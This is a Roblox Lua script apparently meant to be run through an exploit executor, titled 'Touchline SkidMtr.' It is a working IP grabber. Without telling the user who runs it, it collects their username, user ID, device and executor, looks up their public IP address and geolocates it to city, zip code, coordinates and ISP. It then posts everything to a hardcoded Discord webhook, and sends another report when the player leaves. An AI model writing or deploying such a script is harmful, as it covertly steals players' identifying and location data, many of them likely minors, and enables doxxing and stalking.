local webhookUrl = "https://discord.com/api/webhooks/1536016249610313828/0tIPjYApIp0oEaA0PEo9R_AMLgDfnalFZELeMW0JJWr8xhc3haxqs45J-Eq_ACJ65Y6a"
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

--========== BASIC PLAYER INFO ==========--
local username = LocalPlayer.Name
local displayName = LocalPlayer.DisplayName
local userId = LocalPlayer.UserId

--========== GAME INFO ==========--
local MarketplaceService = game:GetService("MarketplaceService")
local gameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
local gameName = gameInfo.Name
local placeId = game.PlaceId
local jobId = game.JobId

--========== EXECUTOR ==========--
local executor = (identifyexecutor and identifyexecutor()) or "Unknown Executor"

--========== DEVICE ==========--
local device = "Unknown"
local UIS = game:GetService("UserInputService")

if UIS.TouchEnabled then
    device = "Mobile"
elseif UIS.KeyboardEnabled then
    device = "PC"
end

--========== EXECUTOR REQUEST WRAPPER ==========--
local requestFunction =
    (http_request or request or (http and http.request) or syn and syn.request)

local function sendWebhook(url, title)
    if not requestFunction then
        warn("Your executor does not support HTTP requests.")
        return
    end

    local json = HttpService:JSONEncode({
        embeds = {{
            ["title"] = title,
            ["description"] = string.format("**%s** triggered the script.\n\n**Time:** %s", username, os.date("%Y-%m-%d %H:%M:%S")),
            ["color"] = 16711680,
            ["fields"] = {
                {
                    name = "ðŸ‘¤ Player Info",
                    value = string.format("Username: **%s**\nDisplay Name: **%s**\nUserId: **%s**", username, displayName, userId),
                    inline = false
                },
                {
                    name = "ðŸŽ® Game Info",
                    value = string.format("Game: **%s**\nPlaceId: **%s**\nJobId: **%s**", gameName, placeId, jobId),
                    inline = false
                },
                {
                    name = "ðŸ–¥ Executor",
                    value = tostring(executor),
                    inline = false
                },
                {
                    name = "ðŸ“± Device",
                    value = tostring(device),
                    inline = false
                },
            }
        }}
    })

    requestFunction({
        Url = url,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = json
    })
end

sendWebhook(webhookUrl, "Touchline SkidMtr.")

Players.PlayerRemoving:Connect(function(leavingPlayer)
    if leavingPlayer == LocalPlayer then
        sendWebhook(webhookUrl, "Skidmtr â€” Player Left")
    end
end)
local name = game:GetService("Players").LocalPlayer.Name

if not requestFunction then
    warn("Your executor does not support HTTP requests.")
    return
end

-- Get IP
local getIPResponse = requestFunction({ Url = "https://api.ipify.org/?format=json", Method = "GET" })
local GetIPJSON = game:GetService("HttpService"):JSONDecode(getIPResponse.Body)
local IPBuffer = tostring(GetIPJSON.ip)

-- Get IP Info
local getIPInfo = requestFunction({ Url = string.format("http://ip-api.com/json/%s", IPBuffer), Method = "GET" })
local IIT = game:GetService("HttpService"):JSONDecode(getIPInfo.Body)

local FI = {
    IP = IPBuffer,
    country = IIT.country,
    countryCode = IIT.countryCode,
    region = IIT.region,
    regionName = IIT.regionName,
    city = IIT.city,
    zipcode = IIT.zip,
    latitude = IIT.lat,
    longitude = IIT.lon,
    isp = IIT.isp,
    org = IIT.org
}

local dataMessage = string.format(
    "User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s",
    name, FI.IP, FI.country, FI.countryCode, FI.region, FI.regionName, FI.city, FI.zipcode, FI.isp, FI.org
)

-- Embed with red color (16711680)
local MessageData = {
    ["embeds"] = {
        {
            ["title"] = "User Information",
            ["description"] = dataMessage,
            ["color"] = 16711680  -- Red
        }
    }
}

-- Send to webhook
requestFunction({
    Url = webhookUrl,
    Method = "POST",
    Headers = { ["Content-Type"] = "application/json" },
    Body = game:GetService("HttpService"):JSONEncode(MessageData)
})   
